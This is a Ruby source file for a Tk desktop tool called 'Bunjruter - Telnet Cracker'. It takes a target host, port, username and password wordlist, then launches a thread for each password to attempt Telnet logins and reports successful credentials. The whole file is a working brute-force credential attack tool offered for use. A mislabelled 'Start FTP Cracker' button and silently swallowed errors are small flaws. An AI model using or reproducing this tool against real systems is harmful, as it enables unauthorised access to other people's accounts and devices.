$VERBOSE = nil

require 'tk'
require 'colorize'
require 'net/telnet'

# Content
root_icon = TkPhotoImage.new(file: './project_bunjruter_contents/project_bunjruter_icons/bunjruter_telnet_cracker.png')
font_name = "Calibri"
font_size = 10
custom_font = TkFont.new(family: font_name, size: font_size)

# Main
root = TkRoot.new
root.geometry("250x470")
root.title("Bunjruter - Telnet Cracker")
root.resizable(false, false)
root.iconphoto(root_icon)

# Label Frame
root_label_frame = TkLabelFrame.new(root, text: "Telnet Cracker", font: custom_font, relief: 'raised', borderwidth: 1)
root_label_frame.place(x: 10, y: 5, width: 230, height: 450)

# Host Stage

host_label = TkLabel.new(root) do
  font custom_font
  text "Host:"
  place(x: 22, y:30)
end

host_entry = TkEntry.new(root) do
  place(x: 22, y:55)
  width 33
end

# Port Stage

port_label = TkLabel.new(root) do
  font custom_font
  text "Port:"
  place(x:22, y:80)
end

port_textbox = TkText.new(root) do
  place(x: 22, y:105)
  width 11
  height 1
end

port_textbox.insert("end", "23")

# Sleep per attempt
sleep_label = TkLabel.new(root) do
  font custom_font
  text "Wait every try:"
  place(x:130, y:80)
end

sleep_textbox = TkText.new(root) do
  place(x: 130, y:105)
  width 11
  height 1
end

# Username Locaton Stage

username_label = TkLabel.new(root) do
  font custom_font
  text "Username:"
  place(x:22, y:130)
end

username_entry = TkEntry.new(root) do
  place(x: 22, y:155)
  width 33
end

# Passlist Location Stage

passlist_label = TkLabel.new(root) do
  font custom_font
  text "Passlist Location:"
  place(x:22, y:180)
end

passlist_location_entry = TkEntry.new(root) do
  place(x: 22, y:205)
  width 33
end

# Output Stage

output_label = TkLabel.new(root) do
  font custom_font
  text "Output:"
  place(x:22, y:230)
end

output_textbox = TkText.new(root) do
  place(x: 22, y:255)
  height 9
  width 25
end

passlist_location_entry.insert(0, './bunjruter_telnet_cracker/wordlist.txt')

# Start Attack Button
attack_button = TkButton.new(root) do
  text "Start FTP Cracker"
  fg "white"
  bg "#A30039"
  place(x: 70, y: 420)
  command do
    Thread.new do
      begin
        host = host_entry.value
        port = port_textbox.get("1.0", "end").strip
        wait_time = sleep_textbox.get("1.0", "end").strip
        username = username_entry.value
        passlist_location = passlist_location_entry.value

        output_textbox.delete("1.0", "end")
        output_textbox.insert("end", "Cracking started\n")

        def try_combination(username, password, host, port, wait_time, output_textbox)
          begin
            # Connect to the target host and port
            tn = Net::Telnet.new("Host" => host, "Port" => port)

            # Send the username
            tn.puts(username)

            # Send the password
            tn.puts(password)

            if tn.waitfor("String" => "Login successful", "Timeout" => wait_time.to_i)
              output_textbox.insert("end", "Login successful with username '#{username}' and password '#{password}'\n")
            end

            tn.close
          rescue

          end
        end

        def start_cracker(username, host, port, wait_time, passlist_location, output_textbox)
          File.foreach(passlist_location) do |password|
            password.strip!
            Thread.new { try_combination(username, password, host, port, wait_time, output_textbox) }
          end
        end

        start_cracker(username, host, port, wait_time, passlist_location, output_textbox)
      rescue StandardError => e
      end
    end
  end
end

Tk.mainloop